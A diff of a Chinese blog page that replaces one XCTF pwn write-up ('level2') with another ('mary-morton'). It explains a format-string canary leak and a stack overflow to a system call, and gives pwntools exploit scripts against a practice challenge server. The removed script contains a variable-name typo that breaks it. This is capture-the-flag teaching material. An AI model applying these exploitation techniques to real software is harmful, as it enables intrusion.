@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界pwn-level2, 小哑师兄">
+    <meta name="keywords" content="攻防世界pwn-mary-morton, 小哑师兄">
     <meta name="description" content="将登太行雪满山">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -27,7 +27,7 @@
 </script>
 
 
-    <title>攻防世界pwn-level2 | 小哑师兄</title>
+    <title>攻防世界pwn-mary-morton | 小哑师兄</title>
     <link rel="icon" type="image/jpeg" href="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -322,12 +322,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-rrpp6m.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-qzmgjq.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界pwn-level2</h1>
+                    <h1 class="description center-align post-title">攻防世界pwn-mary-morton</h1>
                 </div>
             </div>
         </div>
@@ -374,7 +374,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-07-12
+                    2023-09-04
                 </div>
                 
 
@@ -383,7 +383,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    99
+                    334
                 </div>
                 
 
@@ -413,20 +413,33 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>存在溢出点<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230707221748.png" style="zoom:50%;" /><br>存在system调用，以及字符”&#x2F;bin&#x2F;sh”，可以构造返回地址到 system调用，但是如何将“&#x2F;bin&#x2F;sh”参数写入。<br>根据函数调用约定写入覆盖内容1</p>
+                <p><em>最后完成月2023年9月4号</em></p>
+<p>泄漏canary地址<br>存在canary保护<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724083626.png" style="zoom:80%;" /> </p>
+<p>存在system<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724085322.png"  style="zoom:80%;" /></p>
+<p>程序大致的逻辑就是选择一个选项，然后输入，存在两处输入输出，使用了read和printf，第一处中read无法溢出，但是printf存在格式化字符串漏洞，可以组合泄露出canary的地址<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724083831.png" alt="0" style="zoom:80%;" /></p>
+<p>在函数sub_400960，read函数可以溢出，可以通过之前泄漏的canary值来构造payload<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724084040.png" style="zoom:80%;" /></p>
+<p>通过printf泄漏canary的地址，但是在泄漏地址时没有注意%x是输出一个八字节的数，而我算偏移的时候按照单字节算了，而且也没有考虑输入的数据在栈中的偏移，直接拿输入和canary的相对偏移来作为绝对偏移。<br>通过格式化printf输出可以得到buf在栈中的偏移为6<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230724084815.png" style="zoom:80%;" /><br>在栈中buf在0x90出，canary在0x8出，相距0x88，也就是136，在64位环境下，%X输出8字节，136&#x2F;8&#x3D;17,17+6&#x3D;23，因此canary在栈中的偏移为23。<br>完整exp如下</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
-sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
-sys_addr <span class="token operator">=</span> <span class="token number">0x8048320</span>
-binsh <span class="token operator">=</span> <span class="token number">0x804A024</span>
-whaterver_addr <span class="token operator">=</span> <span class="token number">0xcacacaca</span>
-payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>whatever_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Input:"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'cat flag'</span><span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>参数调用格式</p>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+<span class="token comment"># sh = process("./mary_morton")</span>
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">60921</span><span class="token punctuation">)</span>
 
+payload1 <span class="token operator">=</span> <span class="token string">b"%23$p"</span>
+sys_addr <span class="token operator">=</span> <span class="token number">0x4008DA</span>
+
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"3. Exit the battle"</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+canary <span class="token operator">=</span> <span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
+canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>canary<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"3. Exit the battle"</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -452,7 +465,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://blog.yangsx.cn/ctf-pwn/6d0f7c20.html">https://blog.yangsx.cn/ctf-pwn/6d0f7c20.html</a>
+                    <a href="https://blog.yangsx.cn/ctf-pwn/9dff28e7.html">https://blog.yangsx.cn/ctf-pwn/9dff28e7.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -798,17 +811,18 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/ctf-pwn/4b131921.html">
+                <a href="/ctf-pwn/9dff28e7.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-jxyowm.png" class="responsive-img" alt="攻防世界pwn-CGFsb">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-qzmgjq.jpg" class="responsive-img" alt="攻防世界pwn-mary-morton">
                         
-                        <span class="card-title">攻防世界pwn-CGFsb</span>
+                        <span class="card-title">攻防世界pwn-mary-morton</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -818,9 +832,9 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-16
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-04
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -833,6 +847,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -851,13 +866,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/ctf-pwn/7d1de980.html">
+                <a href="/ctf-pwn/c42410d2.html">
                     <div class="card-image">
                         
                         
-                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-zyxvqy.jpg" class="responsive-img" alt="攻防世界pwn-hello_pwn">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-rrpp6m.png" class="responsive-img" alt="攻防世界pwn-反应釜开关">
                         
-                        <span class="card-title">攻防世界pwn-hello_pwn</span>
+                        <span class="card-title">攻防世界pwn-反应釜开关</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -868,7 +883,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-10
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-04
                             </span>
                         <span class="publish-author">
                             
